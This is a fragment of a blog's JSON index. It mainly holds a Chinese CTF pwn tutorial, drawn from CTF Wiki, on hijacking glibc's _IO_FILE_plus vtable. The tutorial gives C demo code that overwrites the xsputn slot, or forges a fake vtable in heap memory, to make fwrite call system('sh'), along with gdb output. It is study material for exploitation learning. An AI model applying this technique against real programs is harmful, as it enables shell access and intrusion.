puts(&quot;答案：fun3\\n&quot;);    fun3();    return 0;&#125;\n\n","categories":["C/C++"],"tags":["结构体"]},{"title":"IO利用之伪造 Vtable 劫持程序流程","url":"/2025/11/15/IO%E5%88%A9%E7%94%A8%E4%B9%8B%E4%BC%AA%E9%80%A0vtable%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B/","content":"IO利用之伪造 vtable 劫持程序流程建议学习的前置知识：\n\n-&gt;Linux下I&#x2F;O库中的FILE结构&#x2F;\n-&gt;_IO_FILE_plus结构\n\n概述\nLinux中的一些常见的IO操作函数都要经过FILE结构处理，其中_IO_FILE_plus结构中存在vtable，而某些函数会取出vtable中的指针进行调用\nstruct _IO_FILE_plus&#123;  FILE file;  const struct _IO_jump_t *vtable;&#125;;\n\n根据上述，我们可以通过伪造 _IO_FILE_plus 的 vtable 来劫持程序流程，把vtable指向我们已经可以控制的内存，如某个chunk，随后我们有两种思路来利用\n\n直接改写vtable中的函数指针(需要有任意地址写)\n覆盖vtable的指针-&gt;指向我们控制的内存，在其中布置函数指针\n\n演示\n下面用CTF-wiki的例子来演示\n在此之前我们得知道_IO_FILE_plus位于哪，对于fopen 是位于堆内存中 ， 而对于stdin\\stdout\\stderr是位于libc.so中的\nint main(void)&#123;    printf(&quot;这里演示修改vtable中的指针&quot;)    FILE *fp;    long long *vtable_ptr;    fp=fopen(&quot;flag.txt&quot;,&quot;rw&quot;);    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable    vtable_ptr[7]=0x41414141 //xsputn    printf(&quot;call 0x41414141&quot;);&#125;\n\n在64位系统下vtable地址在_IO_FILE_plus的偏移为0xd8 ，由于printf会调用vtable中的xsputn所以我们就可以更改xsputn为某个目标地址，xsputn是vtable中的第八项源码位于我的IO利用之利用stdout泄露libc中 \n\nctf-wiki: \n在 xsputn 等 vtable 函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus 地址。\n\n比如调用 printf，传递给 vtable 的第一个参数就是_IO_2_1_stdout_的地址。\n利用：\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define system_ptr 0x7ffff7a52390;int main(void)&#123;    FILE *fp;    long long *vtable_ptr;    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable    memcpy(fp,&quot;sh&quot;,3);    vtable_ptr[7]=system_ptr //xsputn    fwrite(&quot;hi&quot;,2,1,fp);&#125;\n\n下面用gdb调试一下看看怎么个事\n运行到14行，可以看见我们的vtabel_ptr已经变成了_IO_file_jumps的地址了\n\n查房！里面的成员第八项就是我们的xsputn直接执行vtable_ptr[7]=system_ptr \n\n按理来说我们是可以直接修改的但是\npwndbg&gt; Program received signal SIGSEGV, Segmentation fault.0x00005555555551f0 in main () at IO_vtable.c:1616          vtable_ptr[7]=system_ptr //xsputn\n\n我们这里显示段错误\n\n原因：在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。 IO_FILE_plus 结构中的 vtable 是 const 修饰的, 默认的在 libc 只读数据段, 所以 vtable 中的函数指针不能直接更改 –&gt; const struct _IO_jump_t *vtable;\n\n但是我们可以使用第二种思路-&gt;在可控的内存中伪造 vtable \n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define system_ptr 0x7ffff7a52390;int main(void)&#123;    FILE *fp;    long long *vtable_addr,*fake_vtable;    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);    fake_vtable=malloc(0x40);    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset    vtable_addr[0]=(long long)fake_vtable; //修改vtable指针为我们可控的内存地址    memcpy(fp,&quot;sh&quot;,3);    fake_vtable[7]=system_ptr; //xsputn    fwrite(&quot;hi&quot;,2,1,fp);&#125;\n\n程序的逻辑和原来的差不多，只是我们的vtable_addr改为了 IO_FILE_plus 结构（这里是fp）中的 vtable指针地址，然后我们把这个指针改为我们可以控制的内存地址–&gt;fake_vtable，然后将fp的头部改为’sh’(因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递)，把fake_vtable第八项成员改为system的地址，这样当我们调用fwrite的时候就会执行system(‘sh’)\n同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\\stdout\\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。\n参考：伪造vtable劫持程序流程 - CTF Wiki\n","categories":["PWN"],"tags":["pwn_IO"]}]